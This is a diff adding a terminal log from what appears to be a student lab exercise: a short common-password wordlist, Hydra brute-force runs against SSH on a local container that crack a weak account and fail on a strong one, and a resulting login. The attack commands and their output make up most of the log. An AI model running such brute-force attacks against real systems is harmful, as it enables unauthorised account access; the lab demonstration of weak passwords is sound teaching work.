@@ -1,0 +1,67 @@
+┌──(kali㉿kali)-[~/Desktop/CS-Vaje/project]
+└─$ cat passwords.txt         
+123456
+password
+password123
+admin
+admin123
+qwerty
+letmein
+welcome
+student
+student123
+test
+test123
+123456789
+iloveyou
+changeme
+P@ssw0rd
+SecurePass!2024
+Str0ng#Key99
+MySafePassword!
+UltraSecure_2026!
+                                                                          
+┌──(kali㉿kali)-[~/Desktop/CS-Vaje/project]
+└─$ hydra -l weakuser -P passwords.txt ssh://localhost:2222
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-17 16:27:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
+[DATA] attacking ssh://localhost:2222/
+[2222][ssh] host: localhost   login: weakuser   password: 123456
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-17 16:27:58
+                                                                          
+┌──(kali㉿kali)-[~/Desktop/CS-Vaje/project]
+└─$ hydra -l stronguser -P passwords.txt ssh://localhost:2222
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-17 16:28:32
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
+[DATA] attacking ssh://localhost:2222/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-17 16:28:39
+
+┌──(kali㉿kali)-[~/Desktop/CS-Vaje/project]
+└─$ ssh weakuser@localhost -p 2222
+weakuser@localhost's password: 
+Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 7.1.5+kali-arm64 aarch64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Nov 17 15:16:11 2026 from 172.18.0.1
+weakuser@c89f108feb2c:~$ 
+
+
+## Time needed weak user 3s, stronguser 5s
